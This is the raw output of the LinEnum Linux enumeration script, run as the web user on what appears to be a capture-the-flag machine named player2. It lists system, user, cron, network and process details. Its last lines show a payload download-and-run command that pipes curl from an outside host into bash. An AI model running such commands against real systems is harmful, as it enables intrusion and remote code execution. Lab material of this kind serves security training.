
[00;31m#########################################################[00m
[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
[00;31m#########################################################[00m
[00;33m# www.rebootuser.com[00m
[00;33m# version 0.98[00m

[-] Debug Info
[+] Report name = LinEnum-03-02-20
[00;33m[+] Thorough tests = Disabled[00m


[00;33mScan started at:
Mon Feb  3 10:03:51 UTC 2020
[00m

[00;33m### SYSTEM ##############################################[00m
[00;31m[-] Kernel information:[00m
Linux player2 5.2.5-050205-generic #201907310632 SMP Wed Jul 31 06:35:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


[00;31m[-] Kernel information (continued):[00m
Linux version 5.2.5-050205-generic (kernel@sita) (gcc version 9.1.0 (Ubuntu 9.1.0-9ubuntu2)) #201907310632 SMP Wed Jul 31 06:35:07 UTC 2019


[00;31m[-] Specific release information:[00m
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.2 LTS"
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.2 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[00;31m[-] Hostname:[00m
player2


[00;33m### USER/GROUP ##########################################[00m
[00;31m[-] Current user/group info:[00m
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[00;31m[-] Users that have previously logged onto the system:[00m
Username         Port     From             Latest
root             tty1                      Tue Dec 17 13:31:35 +0000 2019
observer         pts/0    172.16.118.129   Sun Dec  1 15:33:19 +0000 2019


[00;31m[-] Who else is logged on:[00m
 10:03:51 up 12:50,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[00;31m[-] Group memberships:[00m
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon) groups=1(daemon)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(observer) gid=1000(observer) groups=1000(observer)
uid=111(mysql) gid=114(mysql) groups=114(mysql)
uid=112(mosquitto) gid=115(mosquitto) groups=115(mosquitto)
uid=1001(egre55) gid=1001(egre55) groups=1001(egre55)


[00;31m[-] It looks like we have some admin users:[00m
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)


[00;31m[-] Contents of /etc/passwd:[00m
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
observer:x:1000:1000:observer:/home/observer:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
mosquitto:x:112:115::/var/lib/mosquitto:/usr/sbin/nologin
egre55:x:1001:1001::/home/egre55:/bin/sh


[00;31m[-] Super user account(s):[00m
root


[00;31m[-] Are permissions on /home directories lax:[00m
total 12K
drwxr-xr-x  3 root     root     4.0K Jul 27  2019 .
drwxr-xr-x 23 root     root     4.0K Sep  5 03:33 ..
drwxr-xr-x  6 observer observer 4.0K Nov 16 15:19 observer


[00;31m[-] Root is allowed to login via SSH:[00m
PermitRootLogin yes


[00;33m### ENVIRONMENTAL #######################################[00m
[00;31m[-] Environment information:[00m
APACHE_LOG_DIR=/var/log/apache2
LANG=C
OLDPWD=/var/www/product/protobs
INVOCATION_ID=50056e33772d4e1990ac2d07e13246a5
APACHE_LOCK_DIR=/var/lock/apache2
PWD=/tmp
JOURNAL_STREAM=9:32496
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env


[00;31m[-] Path information:[00m
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


[00;31m[-] Available shells:[00m
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/bin/rbash
/bin/dash
/usr/bin/tmux
/usr/bin/screen


[00;31m[-] Current umask value:[00m
0022
u=rwx,g=rx,o=rx


[00;31m[-] umask value as specified in /etc/login.defs:[00m
UMASK		022


[00;31m[-] Password and storage information:[00m
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


[00;33m### JOBS/TASKS ##########################################[00m
[00;31m[-] Cron jobs:[00m
-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Aug  1  2019 .
drwxr-xr-x 101 root root 4096 Dec 17 13:42 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  589 Jun 26  2018 mdadm
-rw-r--r--   1 root root  712 Jan 17  2018 php
-rw-r--r--   1 root root  191 Feb 14  2019 popularity-contest

/etc/cron.daily:
total 68
drwxr-xr-x   2 root root 4096 Nov 10 13:25 .
drwxr-xr-x 101 root root 4096 Dec 17 13:42 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root  376 Nov 20  2017 apport
-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root  314 Jan 17  2018 aptitude
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  539 Jun 26  2018 mdadm
-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x   1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x   1 root root  214 Jun 27  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Feb 14  2019 .
drwxr-xr-x 101 root root 4096 Dec 17 13:42 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Feb 14  2019 .
drwxr-xr-x 101 root root 4096 Dec 17 13:42 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Feb 14  2019 .
drwxr-xr-x 101 root root 4096 Dec 17 13:42 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  211 Jun 27  2018 update-notifier-common


[00;31m[-] Crontab contents:[00m
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[00;31m[-] Systemd timers:[00m
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES
Mon 2020-02-03 10:09:00 UTC  5min left   Mon 2020-02-03 09:39:01 UTC  24min ago    phpsessionclean.timer        phpsessionclean.service
Mon 2020-02-03 17:32:50 UTC  7h left     Sun 2020-02-02 21:13:57 UTC  12h ago      apt-daily.timer              apt-daily.service
Mon 2020-02-03 21:28:30 UTC  11h left    Sun 2020-02-02 21:28:30 UTC  12h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2020-02-03 22:27:25 UTC  12h left    Mon 2020-02-03 10:02:01 UTC  1min 53s ago motd-news.timer              motd-news.service
Tue 2020-02-04 06:17:01 UTC  20h left    Mon 2020-02-03 06:47:49 UTC  3h 16min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2020-02-10 00:00:00 UTC  6 days left Mon 2020-02-03 00:00:01 UTC  10h ago      fstrim.timer                 fstrim.service

6 timers listed.
[2mEnable thorough tests to see inactive timers[00m


[00;33m### NETWORKING  ##########################################[00m
[00;31m[-] Network and IP info:[00m
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.170  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:3edd  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:3edd  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:3e:dd  txqueuelen 1000  (Ethernet)
        RX packets 16702  bytes 1627233 (1.6 MB)
        RX errors 0  dropped 44  overruns 0  frame 0
        TX packets 1139  bytes 147236 (147.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 223631  bytes 17645123 (17.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 223631  bytes 17645123 (17.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[00;31m[-] ARP history:[00m
_gateway (10.10.10.2) at 00:50:56:b9:90:ea [ether] on ens33


[00;31m[-] Nameserver(s):[00m
nameserver 127.0.0.53


[00;31m[-] Nameserver(s):[00m
Global
          DNSSEC NTA: 10.in-addr.arpa
                      16.172.in-addr.arpa
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa
                      18.172.in-addr.arpa
                      19.172.in-addr.arpa
                      20.172.in-addr.arpa
                      21.172.in-addr.arpa
                      22.172.in-addr.arpa
                      23.172.in-addr.arpa
                      24.172.in-addr.arpa
                      25.172.in-addr.arpa
                      26.172.in-addr.arpa
                      27.172.in-addr.arpa
                      28.172.in-addr.arpa
                      29.172.in-addr.arpa
                      30.172.in-addr.arpa
                      31.172.in-addr.arpa
                      corp
                      d.f.ip6.arpa
                      home
                      internal
                      intranet
                      lan
                      local
                      private
                      test

Link 2 (ens33)
      Current Scopes: none
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no


[00;31m[-] Default route:[00m
default         _gateway        0.0.0.0         UG    0      0        0 ens33


[00;31m[-] Listening TCP:[00m
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1883          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8545            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   


[00;31m[-] Listening UDP:[00m
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   


[00;33m### SERVICES #############################################[00m
[00;31m[-] Running processes:[00m
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.4 225272  9012 ?        Ss   Feb02   0:06 /sbin/init auto automatic-ubiquity noprompt
root          2  0.0  0.0      0     0 ?        S    Feb02   0:00 [kthreadd]
root          3  0.0  0.0      0     0 ?        I<   Feb02   0:00 [rcu_gp]
root          4  0.0  0.0      0     0 ?        I<   Feb02   0:00 [rcu_par_gp]
root          6  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kworker/0:0H]
root          9  0.0  0.0      0     0 ?        I<   Feb02   0:00 [mm_percpu_wq]
root         10  0.0  0.0      0     0 ?        S    Feb02   0:00 [ksoftirqd/0]
root         11  0.0  0.0      0     0 ?        I    Feb02   0:14 [rcu_sched]
root         12  0.0  0.0      0     0 ?        S    Feb02   0:00 [migration/0]
root         13  0.0  0.0      0     0 ?        S    Feb02   0:00 [idle_inject/0]
root         14  0.0  0.0      0     0 ?        S    Feb02   0:00 [cpuhp/0]
root         15  0.0  0.0      0     0 ?        S    Feb02   0:00 [cpuhp/1]
root         16  0.0  0.0      0     0 ?        S    Feb02   0:00 [idle_inject/1]
root         17  0.0  0.0      0     0 ?        S    Feb02   0:00 [migration/1]
root         18  0.0  0.0      0     0 ?        S    Feb02   0:00 [ksoftirqd/1]
root         20  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kworker/1:0H-kb]
root         21  0.0  0.0      0     0 ?        S    Feb02   0:00 [cpuhp/2]
root         22  0.0  0.0      0     0 ?        S    Feb02   0:00 [idle_inject/2]
root         23  0.0  0.0      0     0 ?        S    Feb02   0:00 [migration/2]
root         24  0.0  0.0      0     0 ?        S    Feb02   0:00 [ksoftirqd/2]
root         26  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kworker/2:0H-kb]
root         27  0.0  0.0      0     0 ?        S    Feb02   0:00 [cpuhp/3]
root         28  0.0  0.0      0     0 ?        S    Feb02   0:00 [idle_inject/3]
root         29  0.0  0.0      0     0 ?        S    Feb02   0:00 [migration/3]
root         30  0.0  0.0      0     0 ?        S    Feb02   0:00 [ksoftirqd/3]
root         32  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kworker/3:0H]
root         33  0.0  0.0      0     0 ?        S    Feb02   0:00 [kdevtmpfs]
root         34  0.0  0.0      0     0 ?        I<   Feb02   0:00 [netns]
root         35  0.0  0.0      0     0 ?        S    Feb02   0:00 [rcu_tasks_kthre]
root         36  0.0  0.0      0     0 ?        S    Feb02   0:00 [kauditd]
root         40  0.0  0.0      0     0 ?        S    Feb02   0:00 [khungtaskd]
root         41  0.0  0.0      0     0 ?        S    Feb02   0:00 [oom_reaper]
root         42  0.0  0.0      0     0 ?        I<   Feb02   0:00 [writeback]
root         43  0.0  0.0      0     0 ?        S    Feb02   0:00 [kcompactd0]
root         44  0.0  0.0      0     0 ?        SN   Feb02   0:00 [ksmd]
root         45  0.0  0.0      0     0 ?        SN   Feb02   0:00 [khugepaged]
root         46  0.0  0.0      0     0 ?        I<   Feb02   0:00 [crypto]
root        140  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kintegrityd]
root        141  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kblockd]
root        142  0.0  0.0      0     0 ?        I<   Feb02   0:00 [tpm_dev_wq]
root        143  0.0  0.0      0     0 ?        I<   Feb02   0:00 [ata_sff]
root        144  0.0  0.0      0     0 ?        I<   Feb02   0:00 [md]
root        145  0.0  0.0      0     0 ?        I<   Feb02   0:00 [edac-poller]
root        146  0.0  0.0      0     0 ?        I<   Feb02   0:00 [devfreq_wq]
root        147  0.0  0.0      0     0 ?        S    Feb02   0:00 [watchdogd]
root        150  0.0  0.0      0     0 ?        S    Feb02   0:00 [kswapd0]
root        151  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kworker/u257:0]
root        152  0.0  0.0      0     0 ?        S    Feb02   0:00 [ecryptfs-kthrea]
root        155  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kthrotld]
root        156  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/24-pciehp]
root        157  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/25-pciehp]
root        158  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/26-pciehp]
root        159  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/27-pciehp]
root        160  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/28-pciehp]
root        161  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/29-pciehp]
root        162  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/30-pciehp]
root        163  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/31-pciehp]
root        164  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/32-pciehp]
root        165  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/33-pciehp]
root        166  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/34-pciehp]
root        167  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/35-pciehp]
root        168  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/36-pciehp]
root        169  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/37-pciehp]
root        170  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/38-pciehp]
root        171  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/39-pciehp]
root        172  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/40-pciehp]
root        173  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/41-pciehp]
root        174  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/42-pciehp]
root        175  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/43-pciehp]
root        176  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/44-pciehp]
root        177  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/45-pciehp]
root        178  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/46-pciehp]
root        179  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/47-pciehp]
root        180  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/48-pciehp]
root        181  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/49-pciehp]
root        182  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/50-pciehp]
root        183  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/51-pciehp]
root        184  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/52-pciehp]
root        185  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/53-pciehp]
root        186  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/54-pciehp]
root        187  0.0  0.0      0     0 ?        S    Feb02   0:00 [irq/55-pciehp]
root        188  0.0  0.0      0     0 ?        I<   Feb02   0:00 [acpi_thermal_pm]
root        189  0.0  0.0      0     0 ?        S    Feb02   0:00 [scsi_eh_0]
root        190  0.0  0.0      0     0 ?        I<   Feb02   0:00 [scsi_tmf_0]
root        191  0.0  0.0      0     0 ?        S    Feb02   0:00 [scsi_eh_1]
root        192  0.0  0.0      0     0 ?        I<   Feb02   0:00 [scsi_tmf_1]
root        194  0.0  0.0      0     0 ?        I<   Feb02   0:00 [ipv6_addrconf]
root        208  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kstrp]
root        227  0.0  0.0      0     0 ?        I<   Feb02   0:00 [charger_manager]
root        228  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kworker/2:1H-kb]
root        287  0.0  0.0      0     0 ?        I<   Feb02   0:00 [mpt_poll_0]
root        288  0.0  0.0      0     0 ?        I<   Feb02   0:00 [mpt/0]
root        308  0.0  0.0      0     0 ?        S    Feb02   0:03 [irq/16-vmwgfx]
root        311  0.0  0.0      0     0 ?        I<   Feb02   0:00 [ttm_swap]
root        339  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kworker/3:1H-kb]
root        340  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kworker/0:1H-kb]
root        341  0.0  0.0      0     0 ?        S    Feb02   0:00 [scsi_eh_2]
root        342  0.0  0.0      0     0 ?        I<   Feb02   0:00 [scsi_tmf_2]
root        416  0.0  0.0      0     0 ?        I<   Feb02   0:00 [raid5wq]
root        463  0.0  0.0      0     0 ?        S    Feb02   0:00 [jbd2/sda2-8]
root        464  0.0  0.0      0     0 ?        I<   Feb02   0:00 [ext4-rsv-conver]
root        487  0.0  0.0      0     0 ?        I<   Feb02   0:00 [kworker/1:1H-kb]
root        525  0.0  0.5 118096 11016 ?        Ss   Feb02   0:33 /usr/bin/vmtoolsd
root        547  0.0  1.7 114968 34604 ?        S<s  Feb02   0:05 /lib/systemd/systemd-journald
root        548  0.0  0.0      0     0 ?        I<   Feb02   0:00 [iscsi_eh]
root        550  0.0  0.0  97704  1928 ?        Ss   Feb02   0:00 /sbin/lvmetad -f
root        557  0.0  0.2  46292  5008 ?        Ss   Feb02   0:07 /lib/systemd/systemd-udevd
root        558  0.0  0.0      0     0 ?        I<   Feb02   0:00 [ib-comp-wq]
root        559  0.0  0.0      0     0 ?        I<   Feb02   0:00 [ib-comp-unb-wq]
root        560  0.0  0.0      0     0 ?        I<   Feb02   0:00 [ib_mcast]
root        561  0.0  0.0      0     0 ?        I<   Feb02   0:00 [ib_nl_sa_wq]
root        565  0.0  0.0      0     0 ?        S<   Feb02   0:00 [loop0]
root        583  0.0  0.0      0     0 ?        S<   Feb02   0:00 [loop1]
root        587  0.0  0.0      0     0 ?        I<   Feb02   0:00 [rdma_cm]
systemd+    676  0.0  0.1 141924  3156 ?        Ssl  Feb02   0:06 /lib/systemd/systemd-timesyncd
systemd+    792  0.0  0.2  71844  5200 ?        Ss   Feb02   0:01 /lib/systemd/systemd-networkd
systemd+    868  0.0  0.2  70624  5128 ?        Ss   Feb02   0:05 /lib/systemd/systemd-resolved
root       1062  0.0  0.5  88220 10384 ?        Ss   Feb02   0:00 /usr/bin/VGAuthService
syslog     1066  0.0  0.2 267268  5088 ?        Ssl  Feb02   0:01 /usr/sbin/rsyslogd -n
root       1072  0.0  0.1 110540  3676 ?        Ssl  Feb02   0:02 /usr/sbin/irqbalance --foreground
root       1073  0.0  1.2 1151152 25156 ?       Ssl  Feb02   0:05 /usr/lib/snapd/snapd
root       1074  0.0  0.1  30024  3200 ?        Ss   Feb02   0:00 /usr/sbin/cron -f
daemon     1084  0.0  0.1  28328  2400 ?        Ss   Feb02   0:00 /usr/sbin/atd -f
root       1092  0.0  0.3 286340  6940 ?        Ssl  Feb02   0:01 /usr/lib/accountsservice/accounts-daemon
message+   1096  0.0  0.2  50116  4716 ?        Ss   Feb02   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       1125  0.0  0.0 235448  1872 ?        Ssl  Feb02   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       1133  0.0  0.8 169096 17384 ?        Ssl  Feb02   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       1135  0.0  0.2  62112  5692 ?        Ss   Feb02   0:00 /lib/systemd/systemd-logind
root       1137  0.0  0.2  72292  5752 ?        Ss   Feb02   0:00 /usr/sbin/sshd -D
root       1147  0.0  0.3 288876  6660 ?        Ssl  Feb02   0:00 /usr/lib/policykit-1/polkitd --no-debug
mosquit+   1155  0.0  0.2  48024  5816 ?        S    Feb02   0:17 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
root       1158  0.0  0.1  14884  2044 tty1     Ss+  Feb02   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       1214  0.0  0.9 338008 18564 ?        Ss   Feb02   0:01 /usr/sbin/apache2 -k start
mysql      1235  0.0  9.7 1424480 189860 ?      Sl   Feb02   0:26 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root       1237  0.0  1.0 185924 20068 ?        Ssl  Feb02   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       1277  0.0  0.1  57496  3276 ?        S    Feb02   0:00 /usr/sbin/CRON -f
root       1288  0.0  0.0   4624   772 ?        Ss   Feb02   0:00 /bin/dash -p -c sudo -u egre55 -s /bin/sh -c "/usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php"
root       1294  0.0  0.2  66548  4356 ?        S    Feb02   0:00 sudo -u egre55 -s /bin/sh -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1297  0.0  0.0   4624   872 ?        S    Feb02   0:00 /bin/dash -p -c \/bin\/sh -c \/usr\/bin\/php\ -S\ 0\.0\.0\.0\:8545\ \/var\/www\/main\/server\.php
egre55     1298  0.0  0.0   4624   924 ?        S    Feb02   0:00 /bin/dash -p -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1299  0.0  0.8 273272 16920 ?        S    Feb02   0:01 /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
root      12453  0.0  0.0      0     0 ?        D    05:39   0:14 [kworker/0:2+eve]
www-data  13486  0.0  0.7 343060 14460 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
www-data  13487  0.0  0.7 343060 15148 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
www-data  13488  0.0  0.7 343060 13932 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
www-data  13489  0.0  0.8 343060 15620 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
www-data  13490  0.0  0.4 342420  9464 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
root      29937  0.0  0.0      0     0 ?        I    06:31   0:00 [kworker/0:0]
root      31502  0.0  0.0      0     0 ?        I    07:39   0:01 [kworker/3:0-eve]
root      32121  0.0  0.0      0     0 ?        I    08:09   0:01 [kworker/1:0-rcu]
root      32749  0.0  0.0      0     0 ?        I    08:39   0:00 [kworker/2:1-eve]
root      33372  0.0  0.0      0     0 ?        I    09:09   0:00 [kworker/1:1-eve]
root      33643  0.0  0.0      0     0 ?        I    09:23   0:00 [kworker/u256:1-]
root      33999  0.0  0.0      0     0 ?        I    09:39   0:00 [kworker/2:0-eve]
root      34009  0.0  0.0      0     0 ?        I    09:39   0:00 [kworker/3:2]
root      34104  0.0  0.0      0     0 ?        I    09:44   0:00 [kworker/u256:2-]
www-data  34361  0.0  0.4 342420  9464 ?        S    09:58   0:00 /usr/sbin/apache2 -k start
www-data  34393  0.0  0.0   4380   852 ?        S    09:59   0:00 uploads/761531149.bin.verified
www-data  34394  0.0  0.0   4624   852 ?        S    09:59   0:00 /bin/dash -p -c curl 10.10.14.47/x.sh|bash;..stty sane
